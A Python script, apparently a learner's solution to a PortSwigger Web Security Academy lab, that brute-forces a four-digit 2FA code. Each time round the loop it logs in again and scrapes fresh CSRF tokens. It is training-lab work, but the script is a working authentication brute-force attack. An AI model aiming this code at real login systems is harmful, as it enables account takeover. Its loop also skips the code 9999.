import requests
from bs4 import BeautifulSoup

'''
A simple script written to solve "Lab: 2FA bypass using a brute-force attack" - Portswigger Web Security Academy.
Depending on your luck, it may take from a few minutes to about an hour to find the right mfa code.
To know if I found the right code, I passed all requests through burp and in the HTTP history tab 
I filtered them to display only the responses with the 3xx code and sorted them by name
Remember to replace part of the link with your lab ID in all requests
Written by Julia Zduńczyk
'''


# I set it up so that all requests go through the burp - to conveniently view and filter them
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
session = requests.session()
session.proxies.update(proxies)

# Here I try all possibilities (from 0000 to 9999) in a simple for loop
for i in range(0, 9999):

    # Get first login page
    # Remember to replace part of the link with your lab ID in all requests
    response = session.get('https://<your lab ID>.web-security-academy.net/login', verify=False)

    content = response.content.decode()

    # Find csrf token in a HTML form 
    soup = BeautifulSoup(content, features="html.parser")
    csrf_token = soup.find('input', {'name': 'csrf'}).get('value')

    # Preparing parameteres that will be send
    params = {
        "csrf": csrf_token,
        "username" : "carlos",
        "password" : "montoya"
    }

    # POST first login
    after_login = session.post('https://<your lab ID>.web-security-academy.net/login', data = params, verify=False)
    # Get second login page
    get_login2 = session.get('https://<your lab ID>.web-security-academy.net/login2', verify=False)

    get_login2 = get_login2.content.decode()
    # Again - find new csrf token in a HTML form 
    soup = BeautifulSoup(get_login2)
    csrf_token = soup.find('input', {'name': 'csrf'}).get('value')

    # Prepare mfa-code
    if i < 10:
        mfa_code = '000' + str(i)
    elif i < 100:
        mfa_code = '00' + str(i)
    elif i < 1000:
        mfa_code = '0' + str(i)
    else:
        mfa_code = str(i)
    
    params2 = {
        "csrf": csrf_token,
        "mfa-code" : mfa_code
    }
    # Finally, POST mfa-code with csrf_token
    second_login = session.post('https://<your lab ID>.web-security-academy.net/login2', data = params2, verify=False)

